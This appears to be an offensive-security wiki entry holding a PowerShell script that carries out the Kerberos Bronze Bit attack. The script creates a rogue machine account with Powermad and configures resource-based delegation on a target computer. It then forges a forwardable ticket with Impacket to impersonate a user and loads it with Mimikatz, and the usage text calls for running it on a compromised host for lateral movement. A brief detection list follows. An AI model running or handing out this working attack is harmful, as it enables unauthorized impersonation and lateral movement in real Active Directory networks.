---
type: code
language: powershell
verified: true
tags:
  - kerberos
  - delegation
  - bronze-bit
platforms:
  - Windows
validated: true
---

# powershell-bronze-bit-delegation-abuse-script

## Code

```powershell
# Create a new machine account
Import-Module .\Powermad\powermad.ps1
New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
.\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit

# Set PrincipalsAllowedToDelegateToAccount
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Get-ADComputer AttackerService
Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount

# Execute the attack
python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardable -dc-ip <Domain controller>

# Load the ticket
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
```

## Description

This script automates the Bronze Bit attack by creating a rogue machine account, configuring delegation on a target computer, forging a forwardable Kerberos ticket using Impacket, and loading it with Mimikatz for use in impersonation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| AttackerService | Rogue machine account name | AttackerService |
| AttackerServicePassword | Password for the machine account | AttackerServicePassword |
| Service2 | Target computer for delegation | Service2 |
| User2 | User to impersonate | User2 |
| test.local | Domain name | test.local |
| <Domain controller> | IP of the domain controller | 192.168.1.10 |
| Hashes and AES key | Credentials for authentication (from mimikatz) | 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 |

## Usage

Run this script on a compromised domain-joined machine with AD tools installed. Substitute parameters with environment-specific values. After execution, use the loaded ticket for SMB access or further lateral movement.

## Detection

- AD audit logs for new machine accounts (Event ID 5136) and attribute changes (msDS-AllowedToDelegateTo).
- Kerberos ticket requests with forwardable flags from unusual accounts (Event ID 4769).
- Mimikatz process execution or LSASS access.
- Anomalous SMB connections to admin shares.

## Related

- [[procedures/Kerberos-Bronze-Bit-Attack]]
- [[tools/Powermad]]
- [[tools/Mimikatz]]
- [[tools/Impacket]]
